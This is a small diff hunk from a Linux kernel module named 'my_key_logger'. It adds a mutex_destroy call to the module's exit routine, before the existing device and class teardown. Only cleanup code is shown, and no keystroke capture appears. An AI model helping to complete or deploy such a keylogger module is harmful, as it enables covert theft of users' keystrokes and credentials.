@@ -95,6 +95,7 @@ static int __init my_key_logger_init(void){
 }
 
 static void __exit my_key_logger_exit(void){
+  mutex_destroy(&mkl_mutex);
   device_destroy(mkl_class, MKDEV(majourNumber, 0));
   class_unregister(mkl_class);
   class_destroy(mkl_class);
